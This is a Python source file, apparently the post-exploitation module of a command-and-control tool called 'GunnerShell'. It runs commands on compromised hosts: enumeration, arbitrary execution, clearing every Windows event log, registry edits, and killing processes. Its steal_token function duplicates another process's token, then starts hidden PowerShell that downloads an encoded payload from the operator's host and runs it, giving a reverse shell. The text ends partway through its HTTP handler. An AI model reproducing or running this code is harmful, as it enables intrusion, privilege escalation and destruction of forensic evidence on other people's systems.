import os
import sys
import subprocess
import argparse
import threading
import textwrap
from http.server import HTTPServer, BaseHTTPRequestHandler
from core.session_handlers import session_manager
from core import shell
from core import payload_generator as generate
import core.listeners.tcp_listener as tcp_listener


from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
COLOR_RESET  = "\001\x1b[0m\002"
UNDERLINE_ON  = "\001\x1b[4m\002"
UNDERLINE_OFF = "\001\x1b[24m\002"

PROMPT = f"{UNDERLINE_ON}{brightblue}GunnerShell{UNDERLINE_OFF} > "



def sysinfo(sid, os_type):
    """
    Get basic system information (OS, architecture, hostname, user).
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        # PowerShell: detailed OS info
        cmd = (
        "Get-CimInstance Win32_OperatingSystem | ForEach-Object { "
          "$os = $_; "
          "$cs = Get-CimInstance Win32_ComputerSystem; "
          "$loggedOnCount = (Get-CimInstance -ClassName Win32_LoggedOnUser | "
                           "Where-Object { $_.Antecedent -match 'LogonId' }).Count; "
          "[PSCustomObject]@{ "
            "CSName         = $cs.Name; "
            "Caption        = $os.Caption; "
            "OSArchitecture = $os.OSArchitecture; "
            "Version        = $os.Version; "
            "BuildNumber    = $os.BuildNumber; "
            "Domain         = $cs.Domain; "
            "LoggedOnUsers  = $loggedOnCount; "
          "} "
        "} | Format-List"
    )
    else:
        # Linux/Unix: kernel, hostname, user
        cmd = "uname -a && hostname && id"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None

def ps(sid, os_type):
    """
    List running processes on the remote host.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        cmd = (
            "Get-CimInstance Win32_Process | "
            "Select-Object "
            "@{n='PID';e={$_.ProcessId}},"
            "@{n='Name';e={$_.Name}},"
            "@{n='User';e={ ($_.GetOwner()).User }},"
            "@{n='CPU(s)';e={[math]::Round(($_.UserModeTime + $_.KernelModeTime)/1e7,1)}},"
            "@{n='Mem(MB)';e={[math]::Round($_.WorkingSetSize/1MB,1)}},"
            "@{n='Handles';e={$_.HandleCount}},"
            "@{n='Threads';e={$_.ThreadCount}},"
            "@{n='Started';e={$_.CreationDate}},"
            "@{n='Path';e={$_.ExecutablePath}} | "
            "Format-Table -AutoSize | "
            "Out-String -Width 4096"
        )

    else:
        cmd = "ps -auxww"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None

def getuid(sid, os_type):
    """
    Get the current user identity.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        cmd = "whoami"
    else:
        cmd = "id -un"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None

def getprivs(sid, os_type):
    """
    Attempt to enable and display privileges of the current process.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        cmd = "whoami /priv"
    else:
        # On Linux, show sudo privileges (may prompt or error if not sudo-enabled)
        print(brightyellow + f"[*] Warning this is an interactive command, run sudo -l on an interactive shell instead!")
        #cmd = "sudo -l"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None

def getpid(sid, os_type):
    """
    Get the current process ID on the remote host.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        cmd = "Get-Process -Id $PID | Select-Object -ExpandProperty Id"

    else:
        cmd = "echo $$"

    sess = session_manager.sessions.get(sid)

    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None

    else:
        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None

def getenv(sid, os_type, *vars):
    """
    Retrieve environment variables from the remote host.
      Usage:
        getenv                # fetch all
        getenv VAR1 [VAR2…]   # fetch just those
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if "windows" in os_type:
        if len(vars) == 0:
            # Correct PowerShell one-liner to dump all env vars as NAME=VALUE
            cmd = 'Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }'
        else:
            parts = [f'"{v}=$env:{v}"' for v in vars]
            cmd = "Write-Output " + ", ".join(parts)
    else:
        if len(vars) == 0:
            cmd = "printenv"
        else:
            parts = " ".join(f'"{v}=${v}"' for v in vars)
            cmd = f"sh -c 'printf \"%s\\n\" {parts}'"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None

def exec(sid, os_type, *cmd_parts):
    """
    Execute an arbitrary command on the remote host.
      Usage: exec <command> [args...]
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not cmd_parts:
        return brightyellow + "[*] Usage: exec <command> [args...]"

    # join back into a single command string
    cmd = " ".join(cmd_parts)

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, cmd)
    else:
        out = shell.run_command_tcp(sid, cmd, timeout=0.5)

    return out or ""

def kill(sid, os_type, pid_str):
    """
    Terminate the given PID on the remote host.
      Usage: kill <pid>
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not pid_str.isdigit():
        return brightyellow + "[*] Usage: kill <pid>"

    if "windows" in os_type:
        cmd = f"Stop-Process -Id {pid_str} -Force"
    else:
        cmd = f"kill -9 {pid_str}"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, cmd)
    else:
        out = shell.run_command_tcp(sid, cmd, timeout=1.0)

    if out is None:
        return brightgreen + f"[*] Sent terminate to PID {pid_str}"

    else:
        return out

def getsid(sid, os_type):
    """
    Retrieve the Windows SID of the current token.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" not in os_type:
        return brightyellow + "[*] getsid only supported on Windows"

    cmd = "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, cmd)
    else:
        out = shell.run_command_tcp(sid, cmd, timeout=0.5)

    return out or ""

def clearev(sid, os_type, force=False):
    """
    Clear all Windows event logs.

      Usage:
        clearev            # only if Admin or SeSecurityPrivilege
        clearev -f|--force # skip privilege check
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" not in os_type:
        return brightyellow + "[*] clearev only supported on Windows"

    # Build the check snippet
    check_snippet = (
        "$id = [Security.Principal.WindowsIdentity]::GetCurrent(); "
        "$pr = New-Object Security.Principal.WindowsPrincipal($id); "
        "$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); "
        "$hasSecPriv = (whoami /priv | Select-String SeSecurityPrivilege).Line -match 'Enabled'; "
        "if (-not ($isAdmin -or $hasSecPriv)) { "
          "Write-Output 'Insufficient privileges: must be local Administrator or have SeSecurityPrivilege'; "
          "exit 0 "
        "}; "
    )

    # Build the clear-logs snippet
    clear_snippet = (
        "if (Get-Command Clear-WinEvent -ErrorAction SilentlyContinue) { "
          "Get-WinEvent -ListLog * | ForEach-Object { Clear-WinEvent -LogName $_.LogName -ErrorAction SilentlyContinue } "
        "} else { "
          "wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null } "
        "}"
    )

    # Assemble full command
    if force != False:
        ps_cmd = clear_snippet
    else:
        ps_cmd = check_snippet + clear_snippet

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    # Dispatch
    if sess.transport.lower() in ("http", "https"):
        out = shell.run_command_http(sid, ps_cmd, timeout=3)
    else:
        out = shell.run_command_tcp(sid, ps_cmd, timeout=3)

    return out or brightgreen + "[*] Event logs cleared."

def localtime(sid, os_type):
    """
    Display the remote system’s local date and time.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" in os_type:
        cmd = "Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'"
    else:
        cmd = "date '+%Y-%m-%d %H:%M:%S %z'"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        out = shell.run_command_http(sid, cmd)

    else:
        out = shell.run_command_tcp(sid, cmd)
    
    return out or None

def reboot(sid, os_type):
    """
    Reboot the remote host immediately.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" in os_type:
        cmd = "Restart-Computer -Force"
    else:
        cmd = "shutdown -r now"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        out = shell.run_command_http(sid, cmd)

    else:
        out = shell.run_command_tcp(sid, cmd)
    
    return out or None

def pgrep(sid, os_type, pattern):
    """
    Filter processes by name/pattern.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not pattern:
        return brightyellow + "[*] Usage: pgrep <pattern>"

    if "windows" in os_type:
        cmd = (
            "Get-Process | "
            f"Where-Object {{ $_.ProcessName -match '{pattern}' }} | "
            "Select-Object Id,ProcessName | "
            "Format-Table -AutoSize"
        )

    else:
        cmd = f"pgrep -fl '{pattern}'"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"
    
    if sess.transport.lower() in ("http", "https"):
        out = shell.run_command_http(sid, cmd)

    else:
        out = shell.run_command_tcp(sid, cmd)
    
    return out or None

def pkill(sid, os_type, pattern):
    """
    Terminate processes by name/pattern.
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not pattern:
        return brightyellow + "[*] Usage: pkill <pattern>"

    if "windows" in os_type:
        cmd = (
          "Get-Process | "
          f"Where-Object {{($_.ProcessName -match '{pattern}')}} | "
          "Stop-Process -Force"
        )
    else:
        cmd = f"pkill -f \"{pattern}\""

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"
    
    if sess.transport.lower() in ("http", "https"):
        out = shell.run_command_http(sid, cmd)

    else:
        out = shell.run_command_tcp(sid, cmd)
    
    return out or None

def suspend(sid, os_type, pid_str):
    """
    Suspend the given PID on the remote host.
      Usage: suspend <pid>
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not pid_str.isdigit():
        return brightyellow + "[*] Usage: suspend <pid>"

    if "windows" in os_type:
        # if Suspend-Process exists use it, otherwise P/Invoke NtSuspendProcess
        ps_cmd = (
            "if (Get-Command Suspend-Process -ErrorAction SilentlyContinue) { "
            f"Suspend-Process -Id {pid_str} "
            "} else { "
            f"$p=Get-Process -Id {pid_str}; "
            "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; "
            "public static class PInvoke { "
                "[DllImport(\"ntdll.dll\")] public static extern uint NtSuspendProcess(IntPtr handle); "
            "}' ; "
            "[PInvoke]::NtSuspendProcess($p.Handle) "
            "}"
        )
    else:
        ps_cmd = f"kill -STOP {pid_str}"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, ps_cmd)
    else:
        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0)

    if out == "0":
        return brightgreen + f"[*] PID {pid_str} successfully suspended"

    elif out != "0":
        return out

    else:
        return brightred + f"[!] Failed to suspend process {pid_str}"


def resume(sid, os_type, pid_str):
    """
    Resume the given PID on the remote host.
      Usage: resume <pid>
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if not pid_str.isdigit():
        return brightyellow + "[*] Usage: resume <pid>"

    if "windows" in os_type:
        ps_cmd = (
            "if (Get-Command Resume-Process -ErrorAction SilentlyContinue) { "
            f"Resume-Process -Id {pid_str} "
            "} else { "
            f"$p = Get-Process -Id {pid_str}; "
            "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; "
            "public static class StartAgain { [DllImport(\"ntdll.dll\")] public static extern uint NtResumeProcess(IntPtr handle); }'; "
            "[StartAgain]::NtResumeProcess($p.Handle) "
            "}"
        )
    else:
        ps_cmd = f"kill -CONT {pid_str}"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, ps_cmd)
    else:
        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0)

    if out == "0":
        return brightgreen + f"[*] PID {pid_str} successfully resumed"

    elif out != "0":
        return out

    else:
        return brightred + f"[!] Failed to resume process {pid_str}"

def shutdown(sid, os_type, *args):
    """
    Gracefully shut down or power off the remote host.
      Usage: shutdown          # immediate
             shutdown -r|-h    # reboot (-r) or halt (-h)
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    # decide flags
    flag = args[0].lower() if args else None

    if "windows" in os_type:
        if flag == "-r":
            cmd = "Stop-Computer -Restart -Force"
        elif flag == "-h":
            cmd = "Stop-Computer -Force"
        else:
            cmd = "Stop-Computer -Force"
    else:
        if flag == "-r":
            cmd = "shutdown -r now"
        elif flag == "-h":
            cmd = "shutdown -h now"
        else:
            cmd = "shutdown -h now"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        out = shell.run_command_http(sid, cmd)
    else:
        out = shell.run_command_tcp(sid, cmd, timeout=5.0)

    return out or brightgreen + "[*] Shutdown/reboot issued."

def reg(sid, os_type, action, hive, key_path, value_name=None, value_data=None):
    """
    Interact with the Windows registry.
      Usage:
        reg query HKLM                      # top-level
        reg query HKLM\\Software\\Foo       # a subkey
        reg get   HKLM\\Software\\Foo Name  # one value
        reg set   HKCU\\Env PATH "C:\\X"    # set a value
        reg delete HKCU\\Software\\Bad      # delete a key
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" not in os_type:
        return brightyellow + "[*] reg only supported on Windows"

    action = action.lower()
    if action not in ("query", "get", "set", "delete"):
        return brightyellow + "[*] Usage: reg <query|get|set|delete> <hive>\\<path> [<name> <data>] [/s|/f]"

    # build the native reg.exe invocation
    if action == "query":
        # if no key_path, just query the hive itself
        if key_path:
            target = f"{hive}\\{key_path}"
        else:
            target = hive
        # allow an optional flag like /s for recursive
        flag = value_name or ""
        cmd = f'reg.exe query "{target}" {flag}'.strip()

    elif action == "get":
        if not key_path or not value_name:
            return brightyellow + "[*] Usage: reg get <hive>\\<path> <ValueName>"
        cmd = f'reg.exe query "{hive}\\{key_path}" /v {value_name}'

    elif action == "set":
        if not key_path or not (value_name and value_data):
            return brightyellow + "[*] Usage: reg set <hive>\\<path> <Name> <Data>"
        cmd = (f'reg.exe add "{hive}\\{key_path}" /v {value_name} '
               f'/t REG_SZ /d "{value_data}" /f')

    else:  # delete
        if not key_path:
            return brightyellow + "[*] Usage: reg delete <hive>\\<path> [/f]"
        if value_name:
            cmd = f'reg.exe delete "{hive}\\{key_path}" /v {value_name} /f'
        else:
            cmd = f'reg.exe delete "{hive}\\{key_path}" /f'

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http", "https"):
        return shell.run_command_http(sid, cmd) or None
    else:
        return shell.run_command_tcp(sid, cmd, timeout=3.0) or None

def services(sid, os_type, action=None, svc_name=None):
    """
    List or control services on the remote host.
      Usage:
        services list
        services start   <service_name>
        services stop    <service_name>
        services restart <service_name>
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if action not in ("list", "start", "stop", "restart"):
        return brightyellow + "[*] Usage: services <list|start|stop|restart> [<service_name>]"

    # build the command per-action
    if "windows" in os_type:
        if action == "list":
            ps_cmd = "Get-Service | Format-Table -AutoSize | Out-String -Width 4096"
        else:
            verb = {"start": "Start-Service", "stop": "Stop-Service", "restart": "Restart-Service"}[action]
            # Stop-Service accepts -Force, Restart-Service and Start-Service do not
            force_flag = " -Force" if action == "stop" else ""
            ps_cmd = (
                "try { "
                  f"{verb} -Name '{svc_name}'{force_flag} -ErrorAction Stop; "
                  "Write-Output 'SUCCESS' "
                "} catch { "
                  "Write-Output \"FAILED: $($_.Exception.Message)\" "
                "}"
            )
    else:
        if action == "list":
            ps_cmd = "systemctl list-units --type=service --all"
        else:
            # use shell exit code logic for Linux
            ps_cmd = (
                f"systemctl {action} '{svc_name}' "
                "&& echo SUCCESS || echo FAILED: \"Could not {action} {svc_name}\""
            )

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    out = (shell.run_command_http(sid, ps_cmd) 
           if sess.transport.lower() in ("http","https") 
           else shell.run_command_tcp(sid, ps_cmd, timeout=5.0)
          ) or ""

    # handle list
    if action == "list":
        return out or brightyellow + "[*] No services found."

    # for start/stop/restart, parse SUCCESS / FAILED:
    for line in out.splitlines():
        line = line.strip()
        if line == "SUCCESS":
            if action == "stop":
                return brightgreen + f"[*] Service '{svc_name}' Stopped successfully."
            else:
                return brightgreen + f"[*] Service '{svc_name}' {action}ed successfully."

        if line.startswith("FAILED:") or line.startswith("FAILED"):
            return brightred + f"[!] Insufficient privileges to preform {action} on {svc_name} service"
            
    # fallback if neither token seen
    return brightyellow + "[*] Unexpected output:\n" + out

def netusers(sid, os_type):
    """
    List local user accounts.
      Usage: netusers
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" in os_type:
        cmd = "net user"

    else:
        cmd = "cut -d: -f1 /etc/passwd"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        return shell.run_command_http(sid, cmd) or None

    else:
        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None

def netgroups(sid, os_type):
    """
    List local group accounts.
      Usage: netgroups
    """
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
    if "windows" in os_type:
        cmd = "net localgroup"

    else:
        cmd = "cut -d: -f1 /etc/group"

    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + f"[!] No such session: {display}"

    if sess.transport.lower() in ("http","https"):
        return shell.run_command_http(sid, cmd) or None

    else:
        return shell.run_command_tcp(sid, cmd, timeout=1.0) or None

def steal_token(sid, os_type, *args):
    global page_count
    page_count = 0
    """
    steal_token <PID> -f <format> -p <payload> -lh <ip> -lp <port> -x <http_port> [--ssl] [-obs <1|2|3>] [--beacon_interval <sec>]

    Spins up an HTTP server on -x to serve /payload.ps1 dynamically,
    then steals the token and launches:
      iwr http://<ip>:-x/payload.ps1 | iex

    Example:
      steal_token 1892 -f ps1 -p http-win -lh 10.0.0.1 -lp 4444 -x 8000 --ssl --beacon_interval 10 -obs 2
    """
    if 'windows' not in os_type.lower():
        return "[*] steal_token only supported on Windows"

    parts = list(args)
    if '-p' not in parts:
        return "Usage: steal_token <PID> -p <tcp-win|http-win|https-win> [other flags]"

    # grab the payload type early so we can require beacon_interval only when needed
    try:
        payload_type = parts[parts.index('-p') + 1]

    except IndexError:
        return "Error: you must specify a value after -p"

    # now build a parser tailored to that payload
    parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
    parser.add_argument('pid', type=int)
    parser.add_argument('-f','--format', choices=['ps1'], required=True)
    parser.add_argument('-p','--payload', choices=['tcp-win','http-win','https-win'], required=True)
    parser.add_argument('-lh','--local_host', required=True)
    parser.add_argument('-lp','--local_port', type=int, required=True)
    parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
    parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
    parser.add_argument('--ssl', action='store_true')
    parser.add_argument('-obs', type=int, choices=[1,2,3], default=0)

    # only HTTP(S) needs a beacon interval
    if payload_type in ('http-win','https-win'):
        parser.add_argument('--beacon_interval', type=int, required=True)

    try:
        opts = parser.parse_args(parts)
    except SystemExit:
        return parser.format_usage()

    # From here on you can safely use opts.beacon_interval for http-win/https-win,
    # and it won’t exist (or is None) for tcp-win.
    if opts.payload == 'tcp-win':
        full = generate.generate_windows_powershell_tcp(opts.local_host, opts.local_port, opts.obs, opts.ssl, True)

    elif opts.payload == 'http-win':
        full = generate.generate_windows_powershell_http(opts.local_host, opts.local_port, opts.beacon_interval, opts.obs)

    else:  # https-win
        full = generate.generate_windows_powershell_https(opts.local_host, opts.local_port, opts.beacon_interval, opts.obs)

    priv_check = """$ErrorActionPreference='Continue'; $reqs=@('SeDebugPrivilege','SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege'); $have=whoami /priv|Select-String 'Enabled'|%{($_ -split '\\s+')[0]}; $ok=$true; foreach($r in $reqs){ if($have -contains $r){ Write-Output "HAS $r" } else { Write-Output "MISSING $r"; $ok=$false } }; if($ok){ Write-Output 'SUCCESS' }"""
    
    sess = session_manager.sessions[sid]
    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

    if sess.transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, priv_check, timeout=0.5)

    elif sess.transport in ("http", "https"):
        out = shell.run_command_http(sid, priv_check)

    if "SUCCESS" in out:
        print(brightgreen + f"[*] Agent {display} has required privileges to steal token.")

    if "MISSING SeDebugPrivilege" in out or "MISSING SeImpersonatePrivilege" in out:
        error_msg = brightred + f"[!] Agent {display} does not have the required privileges to steal token."
        return error_msg

    if "MISSING SeAssignPrimaryTokenPrivilege" in out and "MISSING SeDebugPrivilege" not in out and "MISSING SeImpersonatePrivilege" not in out:
        print(brightred + f"[*] Agent {display} is missing SeAssignPrimaryTokenPrivilege privilege.")
        try:
            while True: 
                questioncmd = input(brightyellow + f"Is the process {opts.pid} running as SYSTEM or has SeAssignPrimaryTokenPrivilege Y/n? ").strip()

                if not questioncmd:
                    continue

                if questioncmd in ("yes", "Yes", "YES", "y", "Y"):
                    print(brightyellow + f"[*] Proceeding with exploitation!")
                    break

                if questioncmd in ("no", "No", "NO", "n", "N"):
                    error_msg = brightred + f"[!] Failed to steal token from PID {opts.pid} missing SeAssignPrimaryToken privilege!"
                    return error_msg

        except Exception as e:
            print(brightred + f"[!] An error ocurred while you were answering our question: {e}")

    # extract Base64 payload
    encoded = full.split()[-1]
    # construct the script to serve
    ps_script = (
        f"$enc='{encoded}'\n"
        "IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc)))"
    )

    if opts.serve_https:
        prefix = "https"
    else:
        prefix = "http"

    stage1 = f"""$pro = {opts.pid}
$orig = [IntPtr]::Zero
$dup  = [IntPtr]::Zero

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public enum PROCESS_ACCESS : uint {{
    PROCESS_QUERY_INFORMATION = 0x0400
}}

public enum TOKEN_ACCESS : uint {{
    TOKEN_ASSIGN_PRIMARY    = 0x0001,
    TOKEN_DUPLICATE         = 0x0002,
    TOKEN_IMPERSONATE       = 0x0004,
    TOKEN_QUERY             = 0x0008,
    TOKEN_ALL_ACCESS        = 0xF01FF
}}

// for CreateProcessWithTokenW
public enum LOGON_FLAGS : uint {{
    None = 0x00000000,
    LOGON_WITH_PROFILE = 0x00000001,
    LOGON_NETCREDENTIALS_ONLY = 0x00000002
}}

public enum TOKEN_TYPE : int {{ TokenPrimary = 1, TokenImpersonation = 2 }}
public enum SECURITY_IMPERSONATION_LEVEL : int {{
    SecurityAnonymous=0, SecurityIdentification=1,
    SecurityImpersonation=2, SecurityDelegation=3
}}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO {{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public UInt32 dwX;
    public UInt32 dwY;
    public UInt32 dwXSize;
    public UInt32 dwYSize;
    public UInt32 dwXCountChars;
    public UInt32 dwYCountChars;
    public UInt32 dwFillAttribute;
    public UInt32 dwFlags;
    public UInt16 wShowWindow;
    public UInt16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {{
    public IntPtr hProcess;
    public IntPtr hThread;
    public UInt32 dwProcessId;
    public UInt32 dwThreadId;
}}

public class NativeMethods {{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        PROCESS_ACCESS dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        TOKEN_ACCESS DesiredAccess,
        out IntPtr TokenHandle
    );

    //---- add this: full control so we can CreateEnvironmentBlock + CreateProcessWithTokenW
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int SECURITY_IMPERSONATION_LEVEL,
        int TOKEN_TYPE,               // 1 = Primary, 2 = Impersonation
        out IntPtr phNewToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(
        IntPtr hToken
    );

    [DllImport("userenv.dll", SetLastError=true)]
    public static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

    [DllImport("userenv.dll", SetLastError=true)]
    public static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        LOGON_FLAGS dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );
}}
'@


$hProc = [NativeMethods]::OpenProcess(
    [PROCESS_ACCESS]::PROCESS_QUERY_INFORMATION,
    $false,
    [int]$pro
)
if ($hProc -eq [IntPtr]::Zero) {{
    Write-Error "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::OpenProcessToken($hProc, [TOKEN_ACCESS]::TOKEN_DUPLICATE, [ref]$orig)) {{
    Write-Error "OpenProcessToken failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::DuplicateTokenEx(
        $orig,
        [NativeMethods]::TOKEN_ALL_ACCESS,
        [IntPtr]::Zero,
        2,              
        1,              
        [ref]$dup
     )) {{
    Write-Error "DuplicateTokenEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::ImpersonateLoggedOnUser($dup)) {{
    Write-Error "Impersonation failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}

Write-Host "Impersonation succeeded, now launching powershell.exe as that user..."


$si = New-Object STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object PROCESS_INFORMATION

$exePath = (Get-Command powershell.exe).Source


$CREATE_NO_WINDOW   = 0x08000000

$cmd = 'powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; $wc = New-Object Net.WebClient; $wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy(); $s = $wc.DownloadString(' + "'{prefix}://{opts.local_host}:{opts.http_port}/winsuvccheck'" + '); iex $s}}"'
$success = [NativeMethods]::CreateProcessWithTokenW(
    $dup,
    [LOGON_FLAGS]::None,
    $exePath,
    $cmd,
    $CREATE_NO_WINDOW,
    [IntPtr]::Zero,
    (Get-Location).Path,
    [ref]$si,
    [ref]$pi
)

if (-not $success) {{
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Error "CreateProcessWithTokenW failed: $err"
    
}}"""

    # HTTP server handler
    class _H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/winsuvccheck':
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(ps_script.encode())

            elif self.path == '/winprcrpu':
                self.send_response(200)
